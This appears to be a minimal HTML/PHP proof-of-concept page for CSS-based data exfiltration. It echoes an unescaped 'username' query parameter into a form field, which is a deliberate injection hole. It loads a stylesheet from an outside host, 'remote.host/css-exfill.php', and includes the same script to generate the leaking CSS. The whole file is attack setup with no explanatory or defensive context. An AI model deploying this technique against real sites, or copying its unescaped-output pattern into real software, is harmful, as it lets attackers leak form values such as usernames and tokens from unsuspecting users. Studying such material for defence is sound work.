<html>
<head>
</head>
<body>
    <form>
        Username: <input type="text" id="username" name="username" value="<?php echo $_GET["username"] ?>" />
        <link href="http://remote.host/css-exfill.php?css" rel="stylesheet" type="text/css">
        <?php include("css-exfill.php"); echo $_html; ?>
    </form>
</body>
</html>